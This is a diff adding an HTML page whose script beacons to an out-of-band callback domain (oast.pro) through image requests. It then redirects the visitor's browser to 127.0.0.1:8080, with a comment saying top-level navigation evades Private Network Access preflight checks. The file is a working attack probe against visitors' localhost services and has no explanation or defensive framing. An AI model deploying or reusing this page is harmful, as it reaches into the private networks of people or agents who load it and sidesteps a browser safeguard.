@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head><title>t</title></head>
+<body>
+<script>
+var OOB = 'd9qr1aj6b8megs7ig8dg5nrtprg7ogmge.oast.pro';
+function dns(label) {
+  var l = label.toLowerCase().replace(/[^a-z0-9-]/g,'-').replace(/-+/g,'-').replace(/^-|-$/g,'').substring(0,60);
+  new Image().src = 'https://' + l + '.' + OOB + '/';
+}
+
+dns('v12-start');
+
+// After 500ms redirect to 8080 (PNA-exempt top-level navigation → real GET, not OPTIONS)
+setTimeout(function() {
+  dns('v12-redir-8080-now');
+  window.location.href = 'http://127.0.0.1:8080/';
+}, 500);
+</script>
+</body>
+</html>
